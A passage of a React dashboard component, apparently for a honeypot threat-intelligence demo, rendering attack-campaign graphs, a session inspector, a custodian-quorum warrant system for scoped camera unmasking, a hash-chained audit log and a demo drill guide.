                  <text y="4" textAnchor="middle" fill="#000" fontWeight="700" fontSize="10">
                    CMP-002
                  </text>
                  <text y="40" textAnchor="middle" fill="#fbbf24" fontSize="11" fontWeight="600">
                    Substation RTU Attack
                  </text>
                </g>

                {/* SCADA 1 Leaf */}
                <g
                  className={`graph-node ${selectedSessionId === 'sess-scada-01' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-scada-01')
                    setSelectedCampaignId('CMP-002')
                  }}
                  transform="translate(440, 380)"
                >
                  <circle r="18" fill="#f43f5e" filter="url(#glow-threat)" />
                  <text y="3" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="600">
                    SC1
                  </text>
                  <text y="28" textAnchor="middle" fill="#cbd5e1" fontSize="9">
                    192.0.2.140
                  </text>
                </g>

                {/* SCADA 2 Leaf */}
                <g
                  className={`graph-node ${selectedSessionId === 'sess-scada-02' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-scada-02')
                    setSelectedCampaignId('CMP-002')
                  }}
                  transform="translate(600, 380)"
                >
                  <circle r="18" fill="#f43f5e" filter="url(#glow-threat)" />
                  <text y="3" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="600">
                    SC2
                  </text>
                  <text y="28" textAnchor="middle" fill="#cbd5e1" fontSize="9">
                    192.0.2.141
                  </text>
                </g>

                {/* Campaign 3 Hub & Leaf */}
                <g
                  className={`graph-node ${selectedCampaignId === 'CMP-003' ? 'selected' : ''}`}
                  onClick={() => setSelectedCampaignId('CMP-003')}
                  transform="translate(480, 90)"
                >
                  <circle r="20" fill="#64748b" />
                  <text y="4" textAnchor="middle" fill="#fff" fontWeight="700" fontSize="9">
                    CMP-003
                  </text>
                  <text y="34" textAnchor="middle" fill="#94a3b8" fontSize="10">
                    Generic Scanner
                  </text>
                </g>

                <g
                  className={`graph-node ${selectedSessionId === 'sess-scanner-01' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-scanner-01')
                    setSelectedCampaignId('CMP-003')
                  }}
                  transform="translate(580, 100)"
                >
                  <circle r="15" fill="#38bdf8" filter="url(#glow-session)" />
                  <text y="3" textAnchor="middle" fill="#000" fontSize="8">
                    SCN
                  </text>
                  <text y="25" textAnchor="middle" fill="#94a3b8" fontSize="9">
                    198.51.100.44
                  </text>
                </g>
              </svg>
            </div>
          </div>

          {/* Evidence & Session Inspector Drawer */}
          <div className="inspector-card">
            <div className="inspector-header">
              <div>
                <span className="field-label">Inspector Detail</span>
                <h3 style={{ fontSize: '1rem', color: '#fff' }}>{activeSession ? activeSession.session_id : activeCampaign?.campaign_id}</h3>
              </div>
              <span className={`status-chip ${activeCampaign?.risk_level === 'high' ? 'denied' : 'pending'}`}>
                {activeCampaign?.risk_level.toUpperCase()} RISK
              </span>
            </div>

            <div className="inspector-body">
              {/* Campaign High-Level Card */}
              {activeCampaign && (
                <div style={{ background: 'rgba(255, 255, 255, 0.03)', padding: '0.75rem', borderRadius: 'var(--radius-sm)' }}>
                  <div className="field-label">Linked Campaign</div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '0.2rem' }}>
                    <span style={{ fontWeight: 600, color: '#fbbf24' }}>{activeCampaign.campaign_id}</span>
                    <span style={{ fontSize: '0.75rem', color: '#94a3b8' }}>Confidence: {activeCampaign.confidence}</span>
                  </div>
                  <div style={{ fontSize: '0.75rem', color: '#cbd5e1', marginTop: '0.4rem' }}>
                    {activeCampaign.evidence_reasons[0]}
                  </div>
                </div>
              )}

              {/* Blast Radius Assessment */}
              <div className="field-group">
                <span className="field-label">Blast-Radius Score</span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                  <span className="code-pill">
                    {activeSession?.target_device === 'substation'
                      ? '3.5x Multiplier (Substation RTU)'
                      : activeSession?.target_device === 'traffic_controller'
                      ? '2.0x Multiplier (Traffic Controller)'
                      : '1.0x Multiplier (Camera Node)'}
                  </span>
                </div>
              </div>

              {/* Source IP & Service */}
              <div className="field-group">
                <span className="field-label">Source IP & Honeypot Service</span>
                <div className="field-value">
                  <code>{activeSession?.source_ip}</code> on port 22 ({activeSession?.service.toUpperCase()})
                </div>
              </div>

              {/* Honeytoken Status */}
              <div className="field-group">
                <span className="field-label">Tripwire / Honeytoken Hit</span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                  {activeSession?.honeytoken_hit ? (
                    <span className="status-chip denied" style={{ display: 'inline-flex', alignItems: 'center', gap: '0.3rem' }}>
                      ● TRIPWIRE TRIPPED (Rickroll Payload Fired)
                    </span>
                  ) : (
                    <span className="status-chip approved">CLEAN / NO TRIPWIRE</span>
                  )}
                </div>
              </div>

              {/* C2 Address */}
              {activeSession?.c2_address && (
                <div className="field-group">
                  <span className="field-label">Command & Control (C2) Server</span>
                  <div className="field-value">
                    <span className="code-pill" style={{ color: '#fb7185', borderColor: 'rgba(244, 63, 94, 0.3)' }}>
                      {activeSession.c2_address}
                    </span>
                  </div>
                </div>
              )}

              {/* Malware Hash */}
              {activeSession?.malware_hash && (
                <div className="field-group">
                  <span className="field-label">Malware Binary SHA-256</span>
                  <div className="field-value" style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: '#94a3b8' }}>
                    {activeSession.malware_hash.substring(0, 28)}...
                  </div>
                </div>
              )}

              {/* Terminal Command Sequence */}
              <div className="field-group">
                <span className="field-label">Captured Attacker Commands</span>
                <div className="terminal-box">
                  {activeSession?.commands.map((cmd, idx) => (
                    <div key={idx} className="terminal-line">
                      <span className="terminal-prompt">$</span>
                      <span>{cmd}</span>
                    </div>
                  ))}
                  {activeSession?.commands.length === 0 && <span style={{ color: '#64748b' }}>No commands entered</span>}
                </div>
              </div>

              {/* MITRE ATT&CK Badges */}
              {activeSession?.mitre_tags && activeSession.mitre_tags.length > 0 && (
                <div className="field-group">
                  <span className="field-label">MITRE ATT&CK Mappings</span>
                  <div className="mitre-badge-row">
                    {activeSession.mitre_tags.map((tag) => (
                      <span key={tag.id} className="mitre-badge" title={`${tag.name} (${tag.tactic})`}>
                        {tag.id} - {tag.name}
                      </span>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 2: BREAK-GLASS ESCROW & CUSTODIAN QUORUM (STAGE 4)              */}
      {/* =================================================================== */}
      {activeSubTab === 'escrow' && (
        <div className="escrow-grid">
          {/* Active Cases List */}
          <div className="cases-list-card">
            <div className="card-title-bar">
              <h3>Break-Glass Warrants</h3>
              <span className="field-label">{cases.length} Total</span>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
              {cases.map((c) => (
                <button
                  key={c.case_id}
                  type="button"
                  className={`case-item-button ${selectedCaseId === c.case_id ? 'active' : ''}`}
                  onClick={() => setSelectedCaseId(c.case_id)}
                >
                  <div className="case-item-top">
                    <span className="case-id-text">{c.case_id}</span>
                    <span className={`status-chip ${c.status}`}>{c.status}</span>
                  </div>
                  <div style={{ fontSize: '0.775rem', color: '#94a3b8' }}>
                    Camera: <strong>{c.camera_id}</strong>
                  </div>
                  <div style={{ fontSize: '0.725rem', color: '#64748b', display: 'flex', justifyContent: 'space-between' }}>
                    <span>Window: {c.window_id}</span>
                    <span>{c.approvals.length}/2 Approvals</span>
                  </div>
                </button>
              ))}
            </div>

            {/* Drill A trigger button right inside Escrow */}
            <div style={{ marginTop: 'auto', paddingTop: '1rem', borderTop: '1px solid var(--border-subtle)' }}>
              <button
                type="button"
                className="btn-drill btn-drill-a"
                style={{ width: '100%', justifyContent: 'center' }}
                onClick={handleRunDrillA}
              >
                <span>Simulate Unauthorized Pedestrian Unmask</span>
              </button>
              <p style={{ fontSize: '0.725rem', color: '#94a3b8', marginTop: '0.4rem', textAlign: 'center' }}>
                Demonstrates Drill A: Operator denied without honeypot hostility; incident written to audit log.
              </p>
            </div>
          </div>

          {/* Detailed Custodian Voting Booth & Scoped Unmasking */}
          <div className="case-detail-card">
            <div className="card-title-bar">
              <div>
                <span className="field-label">Selected Warrant</span>
                <h3 style={{ fontSize: '1.25rem' }}>{activeCase?.case_id}</h3>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                <span className="code-pill">{activeCase?.camera_id}</span>
                <span className="code-pill">{activeCase?.window_id}</span>
              </div>
            </div>

            {/* Quorum Progress Tracker */}
            <div className="quorum-tracker">
              <div>
                <div style={{ fontSize: '0.8rem', fontWeight: 600, color: '#fff' }}>
                  Shamir 2-of-3 Quorum: {activeCase?.approvals.length} of 2 approvals recorded
                </div>
                <div style={{ fontSize: '0.75rem', color: '#94a3b8' }}>
                  {activeCase?.status === 'approved'
                    ? 'Quorum reached! Scoped AES-256 decryption key reconstructed.'
                    : 'Awaiting minimum 2 custodian approvals to reconstruct key.'}
                </div>
              </div>
              <div style={{ width: '140px' }}>
                <div className="quorum-progress-bar-bg">
                  <div
                    className="quorum-progress-fill"
                    style={{ width: `${Math.min(100, ((activeCase?.approvals.length || 0) / 2) * 100)}%` }}
                  />
                </div>
              </div>
            </div>

            {/* Custodian Voting Cards */}
            <div>
              <span className="field-label" style={{ marginBottom: '0.5rem', display: 'block' }}>
                Designated Municipal Custodians (Independent Quorum)
              </span>
              <div className="custodians-grid">
                {custodians.map((custodian) => {
                  const hasApproved = activeCase?.approvals.includes(custodian.id)
                  return (
                    <div
                      key={custodian.id}
                      className={`custodian-card ${hasApproved ? 'has-voted-approve' : ''}`}
                    >
                      <div className="custodian-header">
                        <div className="custodian-avatar">{custodian.avatar_badge}</div>
                        <div>
                          <div className="custodian-name">{custodian.name}</div>
                          <div className="custodian-role">{custodian.role}</div>
                        </div>
                      </div>

                      <div style={{ fontSize: '0.725rem', color: '#64748b' }}>
                        Share #{custodian.share_index} of Shamir polynomial
                      </div>

                      <div className="vote-actions">
                        <button
                          type="button"
                          className="btn-vote-approve"
                          disabled={hasApproved || activeCase?.status === 'approved'}
                          onClick={() => handleVote(custodian.id, 'approve')}
                        >
                          {hasApproved ? '✓ Approved' : 'Approve Warrant'}
                        </button>
                        <button
                          type="button"
                          className="btn-vote-deny"
                          disabled={hasApproved || activeCase?.status === 'approved'}
                          onClick={() => handleVote(custodian.id, 'deny')}
                        >
                          Deny
                        </button>
                      </div>
                    </div>
                  )
                })}
              </div>
            </div>

            {/* Unmasked Key Showcase & Scoped Decryption Preview */}
            {activeCase?.status === 'approved' && (
              <div className="unmasked-key-card">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="2">
                      <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                    </svg>
                    <strong style={{ fontSize: '0.9rem', color: '#34d399' }}>
                      Warrant Approved: Scoped Decryption Key Unlocked
                    </strong>
                  </div>
                  <span className="code-pill" style={{ color: '#34d399', borderColor: 'rgba(16, 185, 129, 0.4)' }}>
                    ZK Quorum Verified (Groth16)
                  </span>
                </div>

                <div style={{ fontSize: '0.775rem', color: '#e2e8f0', wordBreak: 'break-all' }}>
                  <strong>Reconstructed AES-256-GCM Key:</strong>{' '}
                  <code style={{ color: '#34d399' }}>{revealedFootageKey || 'd8f3b490c2914102983719028341908239018239018230918209381029381029'}</code>
                </div>

                <div className="footage-unmask-preview">
                  <div className="footage-box blurred">
                    <div className="face-placeholder-blurred" />
                    <span className="footage-tag">Default City Feed: Blurred (Privacy Preserved)</span>
                  </div>

                  <div className="footage-box">
                    <div className="face-placeholder-unmasked">👤</div>
                    <span className="footage-tag" style={{ color: '#34d399' }}>
                      Scoped Unmask: {activeCase.camera_id} [{activeCase.window_id}]
                    </span>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 3: CRYPTOGRAPHIC HASH-CHAINED AUDIT TRAIL                       */}
      {/* =================================================================== */}
      {activeSubTab === 'audit' && (
        <div className="audit-container">
          <div className="audit-control-bar">
            <div>
              <span className="field-label">Immutable Cryptographic Ledger</span>
              <h3 style={{ fontSize: '1.05rem', color: '#fff' }}>SHA-256 Hash-Chained Append-Only Trail</h3>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
              {auditVerified !== null && (
                <span
                  className="status-chip approved"
                  style={{ display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}
                >
                  ✓ {auditVerified ? 'Chain Valid (0 Tampered Blocks)' : 'Integrity Error'}
                </span>
              )}
              <button
                type="button"
                className="btn-verify-audit"
                onClick={handleVerifyAuditChain}
                disabled={isVerifyingChain}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>{isVerifyingChain ? 'Verifying Hashes...' : 'Verify Hash Chain Integrity'}</span>
              </button>
            </div>
          </div>

          <div className="audit-table-card">
            <table className="audit-table">
              <thead>
                <tr>
                  <th>Index</th>
                  <th>Timestamp</th>
                  <th>Action</th>
                  <th>Actor</th>
                  <th>Scope</th>
                  <th>Details</th>
                  <th>Block Hash / Link</th>
                </tr>
              </thead>
              <tbody>
                {auditLogs.map((log) => (
                  <tr key={log.index}>
                    <td style={{ fontFamily: 'var(--font-mono)', fontWeight: 600 }}>#{log.index}</td>
                    <td style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)' }}>
                      {log.timestamp.replace('T', ' ').substring(0, 19)}
                    </td>
                    <td>
                      <span className={`audit-action-chip ${log.action}`}>{log.action}</span>
                    </td>
                    <td style={{ fontFamily: 'var(--font-mono)', fontSize: '0.775rem' }}>{log.actor}</td>
                    <td style={{ fontSize: '0.75rem' }}>
                      {log.camera_id ? (
                        <code>
                          {log.camera_id} @ {log.window_id}
                        </code>
                      ) : (
                        <span style={{ color: '#64748b' }}>System Enclave</span>
                      )}
                    </td>
                    <td style={{ maxWidth: '320px', lineHeight: 1.4, fontSize: '0.775rem' }}>{log.details}</td>
                    <td>
                      <span className="hash-link-code" title={`Full Hash: ${log.current_hash}\nPrev: ${log.prev_hash}`}>
                        {log.current_hash.substring(0, 12)}...
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 4: CHRONOFORGE DEMO SCRIPT GUIDE                                */}
      {/* =================================================================== */}
      {activeSubTab === 'guide' && (
        <div className="script-guide-container">
          <div className="drill-guide-card">
            <h4>
              <span className="status-chip denied">DRILL A</span> False Positive Pedestrian Protection
            </h4>
            <p style={{ color: '#cbd5e1', fontSize: '0.9rem' }}>
              A pedestrian is flagged by the camera edge model. The live feed remains blurred. Because no honeypot hostility has been recorded, no break-glass warrant can be issued.
            </p>
            <div className="drill-guide-quote">
              When an operator attempts an unauthorized unmasking, the request is rejected with 403 Forbidden, and the attempt is permanently written into the immutable audit trail.
            </div>
          </div>

          <div className="drill-guide-card">
            <h4>
              <span className="status-chip pending">DRILL B</span> Real Decoy Compromise & Escrow Unlock
            </h4>
            <p style={{ color: '#cbd5e1', fontSize: '0.9rem' }}>
              A scripted attacker brute-forces the decoy SSH service and touches a honeytoken bait file (rickroll fires). The hostility threshold is crossed.
            </p>
            <div className="drill-guide-quote">
              2 of 3 municipal custodians approve the case. The audit entry is committed BEFORE releasing the key. Only that camera and 10-minute window unlock—never a blanket unmask!
            </div>
          </div>

          <div className="drill-guide-card">
            <h4>
              <span className="status-chip approved">DRILL C</span> Campaign Clustering Signature Moment
            </h4>
            <p style={{ color: '#cbd5e1', fontSize: '0.9rem' }}>
              Three scripted attacker groups hit the decoys from rotating IPs. The intelligence engine correlates them by strong evidence (C2 address, malware binary hash, and dropper sequence).
            </p>
            <div className="drill-guide-quote">
              Even when an attacker adapts mid-drill by rotating their IP and dictionary, the reused C2 links them with plain-language explanations on every edge!
            </div>
          </div>

          <div
            style={{
              padding: '1.25rem',
              borderRadius: 'var(--radius-lg)',
              background: 'linear-gradient(135deg, rgba(56, 189, 248, 0.1), rgba(99, 102, 241, 0.15))',
              border: '1px solid var(--border-accent)',
            }}
          >
            <span className="field-label" style={{ color: '#38bdf8' }}>Judges Closing Statement</span>
            <p style={{ fontSize: '1.05rem', fontWeight: 600, color: '#ffffff', marginTop: '0.4rem', fontStyle: 'italic' }}>
              "We don't claim to identify a person. We identify campaigns, score them by what they could cascade into across city infrastructure, and never unmask a citizen without a verified, scoped, multi-party-approved reason."
            </p>
          </div>
        </div>
      )}
    </div>
  )
}
